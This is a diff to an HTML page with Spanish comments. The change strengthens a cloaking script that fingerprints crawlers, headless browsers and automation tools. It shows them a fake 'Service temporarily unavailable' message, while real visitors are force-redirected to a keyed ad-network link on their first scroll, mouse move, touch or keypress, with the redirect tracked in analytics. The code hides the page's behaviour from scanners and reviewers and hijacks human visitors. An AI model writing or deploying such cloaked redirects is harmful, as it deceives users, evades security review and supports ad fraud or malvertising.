@@ -16,6 +16,7 @@
       align-items: center;
       height: 100vh;
       text-align: center;
+      overflow-y: scroll;
     }
     .container {
       padding: 20px;
@@ -35,6 +36,7 @@
       box-shadow: 0 0 15px #e50914;
     }
   </style>
+
   <!-- Google Analytics -->
   <script async src="https://www.googletagmanager.com/gtag/js?id=G-H9VLD02NMS"></script>
   <script>
@@ -51,33 +53,42 @@
   </div>
 
   <script>
-    // Ejecutar redirección solo después de que el contenido cargue completamente
-    window.onload = function () {
+    (function() {
       const ua = navigator.userAgent.toLowerCase();
-      const isBot = /bot|crawl|spider|curl|wget|python|fetch|httpclient|java|axios|headless|phantom|scrapy/.test(ua);
+      const isBot = /bot|crawl|spider|curl|wget|python|fetch|httpclient|java|axios|headless|phantom|scrapy|go-http|node|selenium/.test(ua);
       const hasWebDriver = navigator.webdriver;
       const noLang = !navigator.languages || navigator.languages.length === 0;
+      const noPlugins = !navigator.plugins || navigator.plugins.length === 0;
       const screenInvalid = screen.width === 0 || screen.height === 0;
       const isHeadless = ua.includes("headless") || ua.includes("phantom");
 
-      if (isBot || hasWebDriver || noLang || screenInvalid || isHeadless) {
+      if (isBot || hasWebDriver || noLang || noPlugins || screenInvalid || isHeadless) {
         document.body.innerHTML = "<h1>Service temporarily unavailable</h1>";
         return;
       }
 
-      // Espera mínima y luego redirige
-      setTimeout(function () {
-        if (typeof gtag === "function") {
-          gtag('event', 'auto_redirect', {
-            event_category: 'Redirect',
-            event_label: 'Auto Redirect to Offer'
-          });
-        }
+      // Redirección tras primera interacción humana
+      let redirected = false;
+      const redirect = () => {
+        if (redirected) return;
+        redirected = true;
 
-        // Redirección final
-        window.location.href = "https://www.profitableratecpm.com/nke9j3hu?key=34305eacf5bbfa7a826da55202c44b02";
-      }, 300); // suficiente para que móviles no lo bloqueen
-    };
+        setTimeout(() => {
+          if (typeof gtag === "function") {
+            gtag('event', 'auto_redirect', {
+              event_category: 'Redirect',
+              event_label: 'User Interaction Redirect'
+            });
+          }
+          window.location.href = "https://www.profitableratecpm.com/xvfpjymkd?key=8003d76a053acb060070b927d9f5622b";
+        }, 1000); // espera de 1s para evitar bloqueos
+      };
+
+      // Detectar interacción real del usuario
+      ['scroll', 'mousemove', 'touchstart', 'keydown'].forEach(event => {
+        window.addEventListener(event, redirect, { once: true });
+      });
+    })();
   </script>
 </body>
 </html>
